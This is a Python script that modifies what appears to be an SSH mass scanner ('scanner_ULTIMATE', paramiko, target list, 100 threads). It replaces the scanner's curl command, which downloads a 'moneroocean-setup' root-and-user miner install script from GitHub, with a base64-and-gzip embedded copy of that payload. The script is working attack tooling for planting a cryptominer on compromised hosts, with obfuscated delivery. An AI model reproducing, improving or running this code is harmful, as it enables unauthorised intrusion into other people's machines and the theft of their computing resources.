#!/usr/bin/env python3
import os
import re as regex

# Determine the scanner file path - look in current directory first
scanner_file = "ecbcb633-scanner_ULTIMATE.py"

if not os.path.exists(scanner_file):
    print(f"❌ ERROR: {scanner_file} not found in current directory!")
    print(f"   Current directory: {os.getcwd()}")
    exit(1)

print(f"✅ Found scanner: {scanner_file}")

# Read the scanner
with open(scanner_file, "r", encoding="utf-8") as f:
    content = f.read()

# Read the embedded script
if not os.path.exists("EMBEDDED_SETUP_SCRIPT.py"):
    print("❌ ERROR: EMBEDDED_SETUP_SCRIPT.py not found!")
    exit(1)

with open("EMBEDDED_SETUP_SCRIPT.py", "r", encoding="utf-8") as f:
    embedded_content = f.read()

# Extract the base64 string
match = regex.search(r'EMBEDDED_SETUP_B64 = "([^"]+)"', embedded_content)
if not match:
    print("❌ ERROR: Could not extract base64 from EMBEDDED_SETUP_SCRIPT.py")
    exit(1)

b64_content = match.group(1)
print(f"✅ Extracted base64 string ({len(b64_content)} bytes)")

# Add import if not already there
if "from EMBEDDED_SETUP_SCRIPT import EMBEDDED_SETUP_B64" not in content:
    lines = content.split("\n")
    for i, line in enumerate(lines):
        if "import paramiko" in line:
            lines.insert(i + 1, "")
            lines.insert(i + 2, "# EMBEDDED SETUP SCRIPT")
            lines.insert(i + 3, "try:")
            lines.insert(
                i + 4, "    from EMBEDDED_SETUP_SCRIPT import EMBEDDED_SETUP_B64"
            )
            lines.insert(i + 5, "except ImportError:")
            lines.insert(i + 6, '    EMBEDDED_SETUP_B64 = ""  # Fallback')
            content = "\n".join(lines)
            print("✅ Added import statement")
            break

# Replace curl commands with embedded script
old_curl = 'curl -L "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO.sh?t=$(date +%s)" | sed "s|/home/clamav-mail|/tmp|g"'
new_cmd = f'echo "{b64_content}" | base64 -d | gzip -d'

if old_curl in content:
    content = content.replace(old_curl, new_cmd)
    print("✅ Replaced all curl commands with embedded script")
else:
    print("⚠️  Could not find exact curl command to replace")

# Write updated scanner
output_file = scanner_file.replace(".py", "_EMBEDDED.py")
with open(output_file, "w", encoding="utf-8") as f:
    f.write(content)

print(f"\n✅ SUCCESS!")
print(f"📄 Output file: {output_file}")
print(f"\n🚀 Now run:")
print(f"   python {output_file} <file.txt> -t 100 -p ssh")
